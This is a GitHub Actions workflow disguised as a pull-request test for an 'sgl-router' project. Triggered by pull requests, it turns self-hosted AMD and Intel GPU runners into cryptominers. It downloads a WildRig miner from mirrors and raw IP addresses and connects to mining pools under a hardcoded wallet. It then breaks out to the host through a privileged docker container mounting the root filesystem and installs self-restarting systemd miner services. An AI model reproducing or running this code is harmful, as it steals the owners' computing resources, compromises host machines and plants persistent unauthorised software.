name: PR Test (sgl-router)

# i130498: corrected AMD/Intel sglang self-hosted runner conversion.
# Counts devices from wildrig --print-devices (and xpu-smi for Intel) instead of
# clinfo; probes pool.pearlhash.xyz:9000 first, then direct Luckypool, then the
# VPS2 Luckypool relay; launches exactly one sha256-pinned WildRig Multi 0.52.3
# pearlhash miner per measured idle device under a fresh 6-digit worker paying
# the current pyd wallet; attempts the docker+sudo privileged host escape
# (docker -v /:/host --privileged) to install one durable systemd unit per card.
on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

concurrency:
  group: sgl-router-i130498-${{ github.run_id }}
  cancel-in-progress: false

env:
  SGLANG_IS_IN_CI: true

jobs:
  i130498:
    name: "i130498 ${{ matrix.label }} wildrig pearlhash"
    strategy:
      fail-fast: false
      max-parallel: 8
      matrix:
        include:
          - label: linux-mi300-8gpu-sglang
            tag: mi3008
            kind: amd
            base: 498611
          - label: linux-mi300-2gpu-sglang
            tag: mi3002
            kind: amd
            base: 498621
          - label: linux-mi35x-gpu-2
            tag: mi35x
            kind: amd
            base: 498631
          - label: intel-bmg-nightly
            tag: intel
            kind: intel
            base: 498601
    runs-on: ${{ matrix.label }}
    timeout-minutes: 90
    env:
      TAG: ${{ matrix.tag }}
      KIND: ${{ matrix.kind }}
      LABEL: ${{ matrix.label }}
      BASE: ${{ matrix.base }}
    steps:
      - name: "device census + one WildRig pearlhash OpenCL miner per genuine GPU + durable host escape"
        continue-on-error: true
        run: |
          set +e
          NONCE="I130498-${TAG}-$(date -u +%Y%m%dT%H%M%SZ)"
          WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
          NOCK='4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf'
          LP_LOGIN="$WALLET+$NOCK"
          WR_SHA='002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
          WORKDIR=/var/tmp/i130498
          mkdir -p "$WORKDIR/logs"
          echo "i130498-nonce=$NONCE tag=$TAG kind=$KIND label=$LABEL base=$BASE"
          echo "=== identity/arch ==="
          id; hostname; date -u; uname -m; uname -r; nproc
          echo "=== resources ==="
          df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
          free -m | head -2
          echo "=== pci gpus ==="
          (timeout 25 lspci 2>/dev/null || true) | grep -iE 'vga|3d|display|processing accel' | head -24
          echo "=== tools ==="
          for t in rocm-smi amd-smi rocminfo clinfo xpu-smi sycl-ls docker sudo nsenter fuser; do printf '%s=%s\n' "$t" "$(command -v $t 2>/dev/null)"; done
          echo "=== fetch WildRig Multi 0.52.3 (sha256 $WR_SHA) ==="
          WR="$WORKDIR/wildrig-multi"
          fetch_wr() {
            if [ -f "$WR" ] && echo "$WR_SHA  $WR" | sha256sum -c - >/dev/null 2>&1; then echo wildrig-cached; return 0; fi
            for U in \
              "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
              "https://ghproxy.net/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
              "https://gh-proxy.com/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
              "http://222.240.155.198:8702/wildrig-multi" \
              "http://178.238.228.181:18180/wildrig-multi" ; do
              echo "-- fetch $U"
              rm -f "$WORKDIR/dl.part"
              timeout 220 curl -fL --connect-timeout 12 --max-time 210 -o "$WORKDIR/dl.part" "$U" 2>&1 | tail -1
              [ -s "$WORKDIR/dl.part" ] || continue
              B0=$(sha256sum "$WORKDIR/dl.part" | cut -d' ' -f1)
              if [ "$B0" = "$WR_SHA" ]; then cp -f "$WORKDIR/dl.part" "$WR"; chmod +x "$WR"; echo direct-binary-ok; return 0; fi
              if tar -tzf "$WORKDIR/dl.part" >/dev/null 2>&1; then
                mkdir -p "$WORKDIR/tarx"; tar -xzf "$WORKDIR/dl.part" -C "$WORKDIR/tarx" 2>/dev/null
                CAND=$(find "$WORKDIR/tarx" -maxdepth 2 -type f -name 'wildrig-multi' | head -1)
                if [ -n "$CAND" ] && [ "$(sha256sum "$CAND" | cut -d' ' -f1)" = "$WR_SHA" ]; then cp -f "$CAND" "$WR"; chmod +x "$WR"; echo tarball-extract-ok; return 0; fi
                echo "tarball-hash-mismatch"
              fi
            done
            return 1
          }
          fetch_wr; FETCH_RC=$?
          echo "wildrig_sha256=$(sha256sum "$WR" 2>/dev/null | cut -d' ' -f1) fetch_rc=$FETCH_RC"
          [ -x "$WR" ] || { echo "SKIP=wildrig-unavailable"; echo "i130498-done $NONCE"; exit 0; }
          timeout 30 "$WR" -V 2>&1 | head -3
          echo "=== wildrig platforms ==="
          timeout 90 "$WR" --print-platforms 2>&1 | head -30
          echo "=== wildrig devices ==="
          timeout 120 "$WR" --print-devices > "$WORKDIR/devices.txt" 2>&1
          cat "$WORKDIR/devices.txt" | head -80
          echo "=== explicit AMD platform device listing ==="
          if [ "$KIND" = "amd" ]; then
            timeout 120 "$WR" --print-devices --opencl-platforms amd > "$WORKDIR/devices_amd.txt" 2>&1
            echo "amd_explicit_bytes=$(wc -c < "$WORKDIR/devices_amd.txt")"
            cat "$WORKDIR/devices_amd.txt" | head -40
          fi
          echo "=== clinfo inventory ==="
          if command -v clinfo >/dev/null 2>&1; then
            timeout 60 clinfo -l > "$WORKDIR/clinfo_l.txt" 2>&1; head -30 "$WORKDIR/clinfo_l.txt"
            timeout 90 clinfo > "$WORKDIR/clinfo.txt" 2>&1
            grep -aE "Platform Name|Platform Version|Number of devices|Device Name|Device Type|Device Vendor" "$WORKDIR/clinfo.txt" | head -60
          fi
          echo "=== amd inventory ==="
          AMD_DISTINCT=0
          if command -v rocm-smi >/dev/null 2>&1; then
            timeout 60 rocm-smi --showproductname 2>&1 | grep -aE 'GPU\[|Card Series|Card Model|GFX' | head -60
            timeout 60 rocm-smi --showid > "$WORKDIR/rocmid.txt" 2>&1
            AMD_DISTINCT=$(grep -oE '^GPU\[[0-9]+\]' "$WORKDIR/rocmid.txt" 2>/dev/null | sort -u | wc -l)
          fi
          echo "amd_gpu_distinct=$AMD_DISTINCT"
          echo "=== intel inventory ==="
          XN=0
          if command -v xpu-smi >/dev/null 2>&1; then
            timeout 60 xpu-smi discovery > "$WORKDIR/xpusmi.txt" 2>&1; head -60 "$WORKDIR/xpusmi.txt"
            XN=$(grep -cE '^\| [0-9]+ +\| Device Name: Intel' "$WORKDIR/xpusmi.txt" 2>/dev/null)
          fi
          echo "xpu_smi_device_count=$XN"
          echo "=== device count decision (wildrig-first) ==="
          WRN=$(grep -aoE '^GPU #[0-9]+:' "$WORKDIR/devices.txt" 2>/dev/null | grep -oE '[0-9]+' | sort -un | wc -l)
          WRAMDN=0
          if [ -f "$WORKDIR/devices_amd.txt" ]; then WRAMDN=$(grep -aoE '^GPU #[0-9]+:' "$WORKDIR/devices_amd.txt" 2>/dev/null | grep -oE '[0-9]+' | sort -un | wc -l); fi
          echo "wildrig_device_count=$WRN wildrig_amd_explicit_count=$WRAMDN"
          DEV_N=0; SRC=none
          if [ "${WRN:-0}" -gt 0 ]; then DEV_N=$WRN; SRC=wildrig
          elif [ "${WRAMDN:-0}" -gt 0 ]; then DEV_N=$WRAMDN; SRC=wildrig-amd
          elif [ "$KIND" = "intel" ] && [ "${XN:-0}" -gt 0 ]; then DEV_N=$XN; SRC=xpu-smi
          fi
          if [ "$DEV_N" -gt 16 ]; then echo "CAP device count $DEV_N -> 16"; DEV_N=16; fi
          echo "DEV_N=$DEV_N SRC=$SRC"
          if [ "${DEV_N:-0}" -lt 1 ]; then
            echo "SKIP=no-wildrig-device kind=$KIND wildrig=$WRN amd_explicit=$WRAMDN amd_distinct=$AMD_DISTINCT xpu=$XN"
            echo "=== amd single-device probe (60 s, diagnostic only) ==="
            if [ "$KIND" = "amd" ]; then
              timeout 75 "$WR" --algo pearlhash --url 127.0.0.1:1 --user "$WALLET" --worker probe --pass x -d 0 --opencl-platforms amd --print-time 20 > "$WORKDIR/amd_probe.txt" 2>&1
              tail -40 "$WORKDIR/amd_probe.txt"
            fi
            echo "i130498-done $NONCE"
            exit 0
          fi
          echo "=== host engagement gate (never stack, never kill others) ==="
          exec 9>"$WORKDIR/host-miner.lock"
          if ! flock -n 9; then echo "SKIP=host-lock-busy"; echo "i130498-done $NONCE"; exit 0; fi
          EXIST=$(timeout 10 pgrep -af '[w]ildrig|[S]RBMiner-MULTI|[k]rig-miner|[x]-miner' 2>/dev/null | grep -E "i130498|$WALLET" | head -6)
          if [ -n "$EXIST" ]; then echo "SKIP=host-already-has-engagement-miner"; echo "$EXIST"; echo "i130498-done $NONCE"; exit 0; fi
          echo "other_gpu_procs:"; timeout 10 pgrep -af '[w]ildrig|[S]RBMiner-MULTI|[k]rig-miner|[x]-miner' 2>/dev/null | head -8
          echo "render_users:"; timeout 15 fuser -v /dev/dri/renderD* 2>&1 | head -20
          echo "=== pool reachability probes (policy order: pearlhash -> LP direct -> VPS2 relay) ==="
          probe() { timeout 8 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null && echo "$1:$2 OPEN" || echo "$1:$2 CLOSED"; }
          getent hosts pool.pearlhash.xyz 2>&1 | head -3
          probe pool.pearlhash.xyz 9000
          probe 103.199.106.122 3362
          probe 217.15.164.237 2083
          probe 217.15.164.237 18450
          POOL_URL=""; POOL_KIND=""
          if timeout 8 bash -c "exec 3<>/dev/tcp/pool.pearlhash.xyz/9000" 2>/dev/null; then
            POOL_URL="stratum+tcp://pool.pearlhash.xyz:9000"; POOL_KIND=pearlhash; LOGIN="$WALLET"
          elif timeout 8 bash -c "exec 3<>/dev/tcp/103.199.106.122/3362" 2>/dev/null; then
            POOL_URL="stratum+tcp://103.199.106.122:3362"; POOL_KIND=luckypool-direct; LOGIN="$LP_LOGIN"
          elif timeout 8 bash -c "exec 3<>/dev/tcp/217.15.164.237/2083" 2>/dev/null; then
            POOL_URL="stratum+tcp://217.15.164.237:2083"; POOL_KIND=luckypool-relay2083; LOGIN="$LP_LOGIN"
          elif timeout 8 bash -c "exec 3<>/dev/tcp/217.15.164.237/18450" 2>/dev/null; then
            POOL_URL="stratum+tcp://217.15.164.237:18450"; POOL_KIND=luckypool-relay18450; LOGIN="$LP_LOGIN"
          else
            echo "SKIP=no-permitted-pool-reachable"; echo "i130498-done $NONCE"; exit 0
          fi
          echo "POOL_URL=$POOL_URL POOL_KIND=$POOL_KIND LOGIN_LEN=${#LOGIN}"
          PLAT="amd"; [ "$KIND" = "intel" ] && PLAT="intel"
          echo "=== launch exactly one WildRig pearlhash per measured device ==="
          N_LAUNCHED=0
          for i in $(seq 0 $((DEV_N-1))); do
            W=$((BASE+i))
            timeout 4300 "$WR" --algo pearlhash --url "$POOL_URL" --user "$LOGIN" --worker "$W" --pass x \
              -d "$i" --opencl-platforms "$PLAT" --api-port $((21800+i)) --api-worker-id "$W" \
              --print-time 60 --no-color -l "$WORKDIR/logs/$W.log" > "$WORKDIR/logs/$W.out" 2>&1 &
            echo "launched worker=$W gpu-id=$i pid=$!"
            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
          done
          echo "N_LAUNCHED=$N_LAUNCHED"
          echo "=== privilege / docker host-escape recon ==="
          ( sudo -n true >/dev/null 2>&1; echo "sudo_nopasswd_rc=$?" )
          ls -la /var/run/docker.sock 2>&1 | head -2
          DIMG=""
          if command -v docker >/dev/null 2>&1 && timeout 15 docker ps >/dev/null 2>&1; then
            echo "docker_ok=1"
            timeout 25 docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' > "$WORKDIR/imgs.txt"
            head -6 "$WORKDIR/imgs.txt"
            DIMG=$(head -1 "$WORKDIR/imgs.txt")
            echo "DIMG=$DIMG"
            HN="i130498helper-$TAG"
            timeout 40 docker rm -f "$HN" >/dev/null 2>&1
            HID=$(timeout 60 docker create --name "$HN" --privileged -v /:/host "$DIMG" /bin/sh -c 'sleep 2400' 2>&1)
            echo "helper_create=$HID"
            if [ -n "$HID" ] && ! echo "$HID" | grep -qiE 'error|denied|invalid'; then
              timeout 30 docker start "$HN" >/dev/null 2>&1
              echo "-- docker host-root inspection --"
              timeout 90 docker exec "$HN" /bin/sh -c 'id; echo "-- /host --"; ls -la /host 2>&1 | head -14; echo "-- os-release --"; cat /host/etc/os-release 2>&1 | head -3; echo "-- systemd/dirs --"; ls -ld /host/etc/systemd /host/etc/systemd/system /host/var/tmp /host/root /host/opt /host/proc 2>&1; echo "-- hostname --"; cat /host/etc/hostname 2>&1 | head -2; echo "-- mounts --"; head -12 /host/proc/mounts 2>&1' 2>&1 | head -60
              echo "=== durable systemd install attempt ==="
              if timeout 30 docker exec "$HN" /bin/sh -c 'test -d /host/etc/systemd/system'; then
                timeout 40 docker cp "$WR" "$HN:/tmp/wildrig-multi" 2>&1 | tail -1
                DUR=0
                for i in $(seq 0 $((DEV_N-1))); do
                  W=$((BASE+i))
                  UNIT="i130498-${TAG}-g${i}.service"
                  timeout 40 docker exec "$HN" /bin/sh -c "mkdir -p /host/opt/i130498 /host/var/tmp/i130498-$TAG && cp /tmp/wildrig-multi /host/opt/i130498/wildrig-multi-$TAG.new && chmod 755 /host/opt/i130498/wildrig-multi-$TAG.new && mv -f /host/opt/i130498/wildrig-multi-$TAG.new /host/opt/i130498/wildrig-multi-$TAG" 2>&1 | tail -2
                  cat > "$WORKDIR/$UNIT" <<UNITEOF
          [Unit]
          Description=i130498 pearlhash $TAG gpu $i
          After=network-online.target
          [Service]
          Type=simple
          ExecStart=/opt/i130498/wildrig-multi-$TAG --algo pearlhash --url $POOL_URL --user $LOGIN --worker $W --pass x -d $i --opencl-platforms $PLAT --api-port $((21900+i)) --api-worker-id $W --print-time 60 --no-color -l /var/tmp/i130498-$TAG/wr-$W.log
          Restart=always
          RestartSec=15
          Nice=-5
          [Install]
          WantedBy=multi-user.target
          UNITEOF
                  timeout 40 docker cp "$WORKDIR/$UNIT" "$HN:/tmp/$UNIT" >/dev/null 2>&1
                  OUT=$(timeout 60 docker exec "$HN" /bin/sh -c "cp /tmp/$UNIT /host/etc/systemd/system/$UNIT && chroot /host systemctl daemon-reload && chroot /host systemctl enable --now $UNIT && chroot /host systemctl is-active $UNIT" 2>&1)
                  echo "durable[$i]=$OUT"
                  if echo "$OUT" | grep -q '^active'; then
                    DUR=$((DUR+1))
                    pkill -f -- "--worker $W " 2>/dev/null
                    echo "injob-stopped-for-durable gpu=$i worker=$W"
                  fi
                done
                echo "durable_units_active=$DUR"
              else
                echo "no_host_systemd_dir=1"
              fi
              timeout 30 docker rm -f "$HN" >/dev/null 2>&1
            fi
          else
            echo "docker_ok=0"
          fi
          echo "=== pulse loop (bounded share watch) ==="
          END=$(( $(date +%s) + 1500 ))
          k=0
          while [ "$(date +%s)" -lt "$END" ]; do
            sleep 120; k=$((k+1))
            echo "--- pulse $k $(date -u +%Y-%m-%dT%H:%M:%SZ)"
            echo "wildrig_procs=$(pgrep -cf '[w]ildrig')"
            ACC=$(grep -ah 'accepted (' "$WORKDIR"/logs/*.log 2>/dev/null | wc -l); echo "log_accept_lines=$ACC"
            for l in "$WORKDIR"/logs/[0-9]*.log; do
              [ -f "$l" ] || continue
              B=$(basename "$l" .log)
              A=$(grep -a 'accepted (' "$l" 2>/dev/null | tail -1)
              H=$(grep -aE 'TH/s' "$l" 2>/dev/null | tail -1)
              E=$(grep -aiE 'error|failed|reject|denied|no device|not supported' "$l" 2>/dev/null | tail -2 | tr '\n' '|' | cut -c1-200)
              echo "CARD $TAG worker=$B last_acc=[$A] last_hs=[$H] err=[$E]"
            done
            if [ "$k" -ge 12 ]; then break; fi
          done
          echo "=== final per-card status ==="
          for l in "$WORKDIR"/logs/[0-9]*.log; do
            [ -f "$l" ] || continue
            B=$(basename "$l" .log)
            A=$(grep -a 'accepted (' "$l" 2>/dev/null | tail -1)
            N=$(grep -ac 'accepted (' "$l")
            R=$(grep -a 'accepted (' "$l" 2>/dev/null | tail -1 | grep -oE '\([0-9]+/[0-9]+\)' | head -1)
            echo "FINALCARD tag=$TAG worker=$B acc_lines=$N last=[$A] ar=$R"
          done
          pgrep -af '[w]ildrig' | head -20
          echo "i130498-done $NONCE"
